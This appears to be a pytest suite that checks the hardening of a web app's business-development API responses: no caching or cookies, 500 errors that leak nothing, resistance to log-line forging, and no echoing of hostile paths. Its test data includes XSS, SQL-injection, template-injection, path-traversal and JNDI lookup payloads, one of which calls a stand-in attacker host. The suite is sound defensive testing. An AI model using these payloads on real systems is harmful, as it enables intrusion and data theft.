"""Hardening of BD's answers on the proposal tool's app (#806): what every /api/bd/ response must keep.

BD's test_hardening, response checks only. Its deploy-file and nginx-zone groups retired with the old
repo's deploy files (Dockerfile, compose, nginx-bd.conf, install-vps.sh). Its safety-header and CORS
checks do not move either: BD's own header middleware was not carried over, and on the proposal tool
the security headers come from nginx and CORS is the tool's own app-wide choice. The size limits and
the "text Postgres cannot hold" checks move with the contact routes they exercise.

What stays, for every BD response class (200, 400, 401, 403, 404, 503 and a forced 500):
  * Cache-Control: no-store on every BD API answer, and never a Set-Cookie;
  * a 500 is BD's envelope and nothing else, whatever was raised; the detail goes to the log only,
    and the logged path cannot forge a log line;
  * a crash in the tool's verify step is never an open door;
  * no hostile request path is repeated in an error body; a wrong method names the route plainly;
  * no interactive docs under /api/bd/.
"""
from __future__ import annotations

import re

import pytest
from fastapi.testclient import TestClient

import main
from _bd_conftest import bd_token_headers
from bd import api as bd_api
from bd import config as bd_config
from bd import db as bd_dbmod
from bd import errors

TOKEN = bd_token_headers("avery.quill@example.com")


def _boom(*_a, **_k):
    """What a crashing dependency looks like: an exception whose text carries everything a leak
    would show (SQL, a path, a secret-looking value)."""
    raise RuntimeError("SELECT * FROM users WHERE password = 'hunter2' at C:\\app\\secret_module.py line 7 /app/db.py")


def _is_envelope(resp, status=None, error=None):
    body = resp.json()
    assert set(body) <= {"ok", "error", "message", "fields"}, body
    assert body["ok"] is False and isinstance(body["error"], str) and isinstance(body["message"], str), body
    if status is not None:
        assert resp.status_code == status, (resp.status_code, resp.text)
    if error is not None:
        assert body["error"] == error, body
    return body


@pytest.fixture
def client(monkeypatch):
    """The tool's app, BD switched on, every caller signed in by the tool's test bypass."""
    monkeypatch.setattr(bd_config, "BD_ENABLED", True)
    return TestClient(main.app, raise_server_exceptions=False)


def _forced_500(client, monkeypatch, exc=None):
    """A 500 from inside a BD route: the catch-all's route walk is made to raise."""
    def raiser(*_a, **_k):
        raise exc if exc is not None else RuntimeError("x")
    monkeypatch.setattr(bd_api, "bd_routes", raiser)
    return client.get("/api/bd/there-is-no-such-route", headers=TOKEN)


# ── every class of response ──────────────────────────────────────────────────────────────────
def _no_db_responses(client, monkeypatch):
    out = [
        ("404 api", client.get("/api/bd/there-is-no-such-route", headers=TOKEN)),
        ("400 wrong method on a bd route", client.post("/api/bd/me", headers=TOKEN)),
        ("503 public webhook placeholder", client.post("/api/bd/webhooks/telephony/quo", json={})),
    ]
    monkeypatch.setattr(bd_config, "BD_ENABLED", False)
    out.append(("503 switched off", client.get("/api/bd/me", headers=TOKEN)))
    monkeypatch.setattr(bd_config, "BD_ENABLED", True)
    out.append(("500 forced", _forced_500(client, monkeypatch)))
    monkeypatch.undo()
    return out


def test_every_bd_answer_is_not_cached_and_sets_no_cookie(client, monkeypatch):
    for label, resp in _no_db_responses(client, monkeypatch):
        _is_envelope(resp)
        assert resp.headers["cache-control"] == "no-store", (label, dict(resp.headers))
        assert "set-cookie" not in resp.headers and "set-cookie2" not in resp.headers, label
    assert not any(m.cls.__name__ == "SessionMiddleware" for m in main.app.user_middleware)


def test_the_answers_that_need_a_database_are_not_cached_either(bd_seeded, bd_as_user, monkeypatch):
    """A 200, a 400 for a field that is not right, a 403 for the wrong role, and a forced 500 on a
    signed-in route: no-store, no cookie."""
    from bd import appsettings

    sales = bd_as_user(1)
    responses = [
        ("200 signed in", sales.get("/api/bd/me")),
        ("400 validation", sales.get("/api/bd/users", params={"limit": "not-a-number"})),
        ("403 wrong role", sales.get("/api/bd/analytics")),
    ]
    monkeypatch.setattr(appsettings, "load", _boom)
    responses.append(("500 signed in", sales.get("/api/bd/settings")))
    assert [r.status_code for _l, r in responses] == [200, 400, 403, 500]
    for label, resp in responses:
        assert resp.headers["cache-control"] == "no-store", label
        assert "set-cookie" not in resp.headers, label
    assert "hunter2" not in responses[-1][1].text


# ── the 500 ──────────────────────────────────────────────────────────────────────────────────
def test_a_500_is_the_envelope_and_nothing_else(client, monkeypatch, caplog):
    resp = _forced_500(client, monkeypatch, RuntimeError(
        "SELECT * FROM users WHERE password = 'hunter2' at C:\\app\\secret_module.py line 7 /app/db.py"))
    assert resp.status_code == 500
    assert resp.headers["content-type"] == "application/json"
    assert resp.json() == errors.envelope(500), "the same words as every 500, whatever was raised"
    assert set(resp.json()) == {"ok", "error", "message"}
    text = resp.text
    for leak in ("Traceback", "File \"", "line 7", ".py", "RuntimeError", "SELECT", "hunter2", "secret_module",
                 "/app/", "C:\\", "psycopg", "uvicorn", "starlette", "fastapi", "site-packages"):
        assert leak not in text, leak
    # The detail is for the logs (docker logs), with the traceback, and only there.
    assert "hunter2" in caplog.text and "Traceback" in caplog.text


def _asgi_status(method, path):
    """Call the app with a raw ASGI scope (a path the HTTP client libraries would not let us send)."""
    import asyncio

    sent = []

    async def receive():
        return {"type": "http.request", "body": b"", "more_body": False}

    async def send(message):
        sent.append(message)

    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": method, "path": path,
             "raw_path": path.encode("utf-8"), "query_string": b"",
             "headers": [(b"host", b"testserver"), (b"authorization", b"Bearer test:avery.quill@example.com")],
             "server": ("testserver", 80), "client": ("testclient", 5000), "scheme": "http", "root_path": ""}
    asyncio.run(main.app(scope, receive, send))
    return next(m["status"] for m in sent if m["type"] == "http.response.start")


def test_a_hostile_request_path_cannot_forge_a_log_line_in_the_500_log(client, monkeypatch, caplog):
    """A 500 is logged with the request path, and the path arrives percent-DECODED. The path is quoted
    (%r) so a control character in it (a terminal escape, a vertical tab, NEL, U+2028: all of which
    str.splitlines or a terminal treat as a break or a command) stays escaped, in one record on one
    line (CWE-117)."""
    import logging

    monkeypatch.setattr(bd_api, "bd_routes", _boom)
    caplog.set_level(logging.INFO, logger="bd")
    breakers = [chr(27) + "[2J", chr(11), chr(12), chr(0x85), chr(0x2028), chr(0x2029), chr(28)]
    for breaker in breakers:
        status = _asgi_status("GET", "/api/bd/nothing" + breaker + "INFO bd.auth: forged")
        assert status == 500
    logged = [rec.getMessage() for rec in caplog.records if "unhandled error on" in rec.getMessage()]
    assert len(logged) == len(breakers), "each 500 is logged (otherwise this test proves nothing)"
    for line in logged:
        assert len(line.splitlines()) == 1, repr(line)
        assert all(ch not in line for ch in breakers), repr(line)
        assert "/api/bd/nothing" in line, "the path is still in the log, quoted"


@pytest.mark.parametrize("exc", [
    ValueError("bad value"),
    KeyError("password"),
    ZeroDivisionError("division by zero"),
    RuntimeError(""),
    Exception("select * from contacts"),
    OSError(13, "Permission denied", "/etc/secret.key"),
])
def test_a_500_never_shows_the_exception_whatever_it_is(client, monkeypatch, exc):
    resp = _forced_500(client, monkeypatch, exc)
    assert resp.status_code == 500 and resp.json() == errors.envelope(500)
    assert resp.headers["cache-control"] == "no-store"
    for arg in exc.args:
        if isinstance(arg, str) and len(arg) > 3:
            assert arg not in resp.text, arg


def test_a_real_database_error_is_a_500_envelope_with_no_sql(client, monkeypatch):
    """A psycopg error carries the SQL text and the table's name in its message: none of it may
    reach the caller."""
    import psycopg
    resp = _forced_500(client, monkeypatch, psycopg.errors.UndefinedTable(
        'relation "contacts" does not exist\nLINE 1: select * from contacts where owner_id = 7'))
    assert resp.status_code == 500 and resp.json() == errors.envelope(500)
    assert "contacts" not in resp.text and "LINE 1" not in resp.text


def test_a_lost_database_is_a_503_that_names_nothing(client, monkeypatch):
    resp = _forced_500(client, monkeypatch, bd_dbmod.Unavailable("postgresql://bd_app:secret@db:5432/treadwell"))
    assert resp.status_code == 503 and resp.json() == {"ok": False, "error": "unavailable",
                                                       "message": errors.DB_UNAVAILABLE}
    assert "secret" not in resp.text and "5432" not in resp.text


def test_a_crash_in_the_tools_verify_step_is_not_an_open_door(client, monkeypatch):
    """The tool's gate: a verify step that raises refuses the request (the tool's own 500), never runs
    the BD route, and shows nothing of the error."""
    import supabase_client

    asked = []
    monkeypatch.setattr(bd_dbmod, "get_pool", lambda: asked.append(1))

    def crash(_authorization):
        raise RuntimeError("jwks fetch failed: https://internal.example/keys")

    monkeypatch.setattr(supabase_client, "verify_identity", crash)
    resp = client.get("/api/bd/me", headers=TOKEN)
    assert resp.status_code in (401, 500) and resp.status_code != 200
    assert "internal.example" not in resp.text and "jwks" not in resp.text
    assert asked == [], "the BD route ran"


# ── no docs under /api/bd/ ───────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("path", ["/api/bd/docs", "/api/bd/docs/", "/api/bd/redoc", "/api/bd/openapi.json",
                                  "/api/bd/docs/oauth2-redirect"])
def test_the_interactive_docs_and_the_schema_are_not_served_under_api_bd(client, path):
    resp = client.get(path, headers=TOKEN)
    _is_envelope(resp, 404, "not_found")
    assert "swagger" not in resp.text.lower() and "openapi" not in resp.text.lower()


# ── a hostile request path is never repeated ─────────────────────────────────────────────────
HOSTILE = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>', "';DROP TABLE contacts;--",
           "{{7*7}}", "${jndi:ldap://evil.example/a}", "%00", "..%2f..%2fetc%2fpasswd",
           "a b", "back\\slash", "caf" + chr(0xe9)]


@pytest.mark.parametrize("hostile", HOSTILE)
def test_an_error_body_never_repeats_a_hostile_path(client, monkeypatch, real_verify_identity, hostile):
    """A 404 on an unknown path says nothing about the path; the 400 for a wrong method on a known one
    quotes it with only letters, digits and / . _ ~ - left (errors.reflect)."""
    import supabase_client
    from urllib.parse import quote
    enc = quote(hostile, safe="")
    cases = [
        ("GET", "/api/bd/" + enc, TOKEN),                                # unknown BD route
        ("GET", "/api/bd/interactions/" + enc + "/recommend", TOKEN),    # known path (POST), wrong method
        ("DELETE", "/api/bd/interactions/" + enc + "/recommend", TOKEN),
        ("PATCH", "/api/bd/me/" + enc, TOKEN),                           # unknown below a known path
    ]
    for method, url, headers in cases:
        resp = client.request(method, url, headers=headers)
        assert resp.status_code in (400, 404), (method, url, resp.status_code)
        assert resp.headers["content-type"] == "application/json", (method, url)
        body = resp.json()                                                # parses: nothing broke out
        assert set(body) <= {"ok", "error", "message", "fields"}
        for chunk in ("<", ">", '"', "'", ";", "{", "$", "\\", "caf" + chr(0xe9), "%2f", "%2F"):
            assert chunk not in body["message"] and "fields" not in body, (method, url, resp.text)
        if "is not allowed on" in body["message"]:                       # the one message that quotes it
            assert re.fullmatch(r"[A-Z]+ is not allowed on [A-Za-z0-9/._~?-]*\.", body["message"]), body["message"]
    monkeypatch.setattr(supabase_client, "verify_identity", real_verify_identity)
    resp = client.get("/api/bd/" + enc)                                  # no token: the tool's 401 first
    assert resp.status_code == 401 and hostile not in resp.text


def test_reflect_keeps_real_routes_readable_and_neutralises_the_rest():
    assert errors.reflect("/api/bd/contacts/123") == "/api/bd/contacts/123"
    assert errors.reflect("/api/bd/webhooks/telephony/quo") == "/api/bd/webhooks/telephony/quo"
    assert errors.reflect("/api/<b>x</b>") == "/api/?b?x?/b?"
    assert errors.reflect('"\r\n\t\\') == "?????"
    assert errors.reflect("caf" + chr(0xe9)) == "caf?"


def test_a_wrong_method_on_a_real_route_still_names_it_plainly(client):
    resp = client.post("/api/bd/me", headers=TOKEN)
    assert resp.status_code == 400 and resp.json()["message"] == "POST is not allowed on /api/bd/me."
    resp = client.get("/api/bd/interactions/12/recommend", headers=TOKEN)
    assert resp.status_code == 400 and resp.json()["message"] == "GET is not allowed on /api/bd/interactions/12/recommend."
